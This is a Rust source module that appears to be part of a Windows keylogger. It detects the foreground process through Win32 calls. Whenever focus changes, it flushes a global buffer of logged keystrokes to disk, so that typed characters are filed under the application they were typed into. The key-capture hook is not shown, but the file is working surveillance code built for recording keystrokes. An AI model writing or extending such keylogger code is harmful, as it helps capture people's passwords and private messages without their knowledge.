use windows_sys::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
use windows_sys::Win32::System::ProcessStatus::GetModuleBaseNameW;
use windows_sys::Win32::Foundation::{CloseHandle};
use std::sync::Mutex;
use once_cell::sync::Lazy;
use crate::formatting::{update_process_header, update_status_header};
use crate::structs::GLOBAL_KEY_BUFFER;

pub static LAST_PROCESS_NAME: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));

type ProcessNameResult<T> = Result<T, Box<dyn std::error::Error>>;

fn get_focused_process_name() -> ProcessNameResult<(Option<String>, bool)> {
    unsafe {
        // Get the foreground window
        let hwnd = GetForegroundWindow();
        if hwnd == std::ptr::null_mut() {
            return Ok((None, false));
        }

        // Get process ID from a window
        let mut process_id: u32 = 0;
        GetWindowThreadProcessId(hwnd, &mut process_id);

        if process_id == 0 {
            return Ok((None, false));
        }

        // Open process handle
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false as i32, // bInheritHandle = FALSE
            process_id
        );

        if process_handle == std::ptr::null_mut() {
            return Err(format!("Failed to open process for PID {}: {}", process_id, std::io::Error::last_os_error()).into());
        }

        // Get module name
        let mut buffer: [u16; 260] = [0; 260];
        let chars_copied = GetModuleBaseNameW(
            process_handle,
            std::ptr::null_mut(), // hModule = NULL for main executable
            buffer.as_mut_ptr(),
            buffer.len() as u32
        );

        // Cleanup handle
        CloseHandle(process_handle);

        if chars_copied == 0 {
            return Err(format!("Failed to get module name for PID {}: {}", process_id, std::io::Error::last_os_error()).into());
        }

        // Convert UTF-16 to String
        let name = String::from_utf16_lossy(&buffer[..chars_copied as usize]);

        let process_changed = *LAST_PROCESS_NAME.lock().unwrap() != Some(name.clone());

        Ok((Some(name), process_changed))
    }
}

pub fn display_focused_process_name() {
    match get_focused_process_name() {
        // Successfully retrieved the process name and it changed
        Ok((Some(name), true)) => {
            if let Err(e) = update_process_header(&name) {
                eprintln!("Error updating process header: {}", e);
                return;
            }
            
            // Since the process name has changed, we need to flush the buffer
            // to ensure that all currently buffered characters are logged under
            // their process of origin.

            // Essentially, we are flushing the buffer early to ensure that
            // all buffered characters that were logged under the previous process
            // are logged as such before switching to the new process name.

            // This is necessary to maintain confidence that characters logged under a process
            // were indeed logged under that process and didn't spill into a buffer with characters
            // of mixed process origin.

            // Ex. "Abc" was logged under "Process1", but now we are switching to "Process2".
            // We flush the buffer to ensure that "Abc" is logged under "Process1" before
            // we start logging under "Process2" and accepting new characters.

            if let Err(e) = flush_buffer_for_process_change(Some(&name), Some(true)) {
                eprintln!("Error flushing buffer for process change: {}", e);
            }

            let mut last_name= LAST_PROCESS_NAME.lock().unwrap();

            *last_name = Some(name.clone())
        }
        Ok((Some(_name), false)) => {
        }
        Ok((None, false)) => {
        }
        Ok((None, true)) => {
            // No focused process detected, but we still want to update the header
            if let Err(e) = update_process_header("No focused process") {
                eprintln!("Error updating process header: {}", e);
            }
        }
        // Error retrieving process name
        Err(e) => {
            eprintln!("Error retrieving focused process name: {}", e);
            if let Err(e) = update_status_header("❌ Process detection error") {
                eprintln!("Additional error updating status: {}", e);
            }
        }
    }
}

fn flush_buffer_for_process_change(current_name: Option<&str>, process_changed: Option<bool>) -> Result<(), Box<dyn std::error::Error>> {
    GLOBAL_KEY_BUFFER.lock()
        .map_err(|_| "Failed to acquire buffer lock")?
        .flush_to_disk(current_name, process_changed)
        .map_err(|e| format!("Failed to flush key buffer: {}", e).into())
}